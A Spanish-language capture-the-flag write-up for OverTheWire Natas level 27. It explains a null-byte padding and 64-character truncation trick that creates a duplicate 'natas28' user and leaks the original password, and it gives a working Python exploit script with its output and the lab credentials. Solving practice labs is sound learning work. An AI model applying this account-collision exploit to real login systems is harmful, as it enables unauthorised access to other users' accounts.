# Natas 27

#### URL: http://natas27.natas.labs.overthewire.org
#### Credenciales: natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne

El servidor acorta nuestra entrada en cada campo a 64 caracteres:
``` php
$user=mysqli_real_escape_string($link, substr($usr, 0, 64));
    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));
```

La entrada es escapada asi que no podemos hacer inyeccion SQL:
```php
   $user=mysqli_real_escape_string($link, $usr);
   $password=mysqli_real_escape_string($link, $pass);
```

Si el usuario no existe se crea un nuevo usuario y contraseña:
``` php
   //user doesn't exist
        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
        }
```

Para finalizar la base de datos se limpia cada 5 minutos:
``` php
// morla / 10111
// database gets cleared every 5 min
```
Como las cadenas de PHP son basadas en las cadenas de C, las cuales terminan con un byte nulo, podemos introducir el nombre agregandole bytes nulos al final.

Sin embargo antes de que se acorte nuestra entrada se realiza un trim() que puede eliminar nuestros bytes nulos:

![2025-03-21-112623_844x309_scrot](https://github.com/user-attachments/assets/50a706fc-beac-4d4c-95a2-225567fbb967)

Lo que necesitamos es completar la cadena con 64: len(natas28) bytes nulos o mas y luego agregar un caracter cualquiera para pasar el trim y quedarnos con un usuario "natas28" con nueva contraseña.

La base de datos devolvera la primera fila coincidente en la base de datos, mostrando usario y contraseña del natas28 original:
``` php
  while ($row = mysqli_fetch_assoc($res)) {
                // thanks to Gobo for reporting this bug!
                //return print_r($row);
                return print_r($row,true);
            }
```

``` python
import requests
from base64 import b64encode

URL='http://natas27.natas.labs.overthewire.org'
headers={'Authorization':f'Basic {b64encode(b"natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne").decode()}'}
payload={'username':'natas28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00e', 'password': '' }

x = requests.post(URL,headers=headers,data=payload)
print(x.text)
x = requests.post(URL,headers=headers,data={'username':'natas28', 'password':''})
print(x.text)
```

``` python3 script.py
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas27", "pass": "u3RRffXjysjgwFU6b9xa23i6prmUsYne" };</script></head>
<body>
<h1>natas27</h1>
<div id="content">
User natas28e was created!<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas27", "pass": "u3RRffXjysjgwFU6b9xa23i6prmUsYne" };</script></head>
<body>
<h1>natas27</h1>
<div id="content">
Welcome natas28!<br>Here is your data:<br>Array
(
    [username] =&gt; natas28
    [password] =&gt; 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj
)
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

`natas28:1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj`

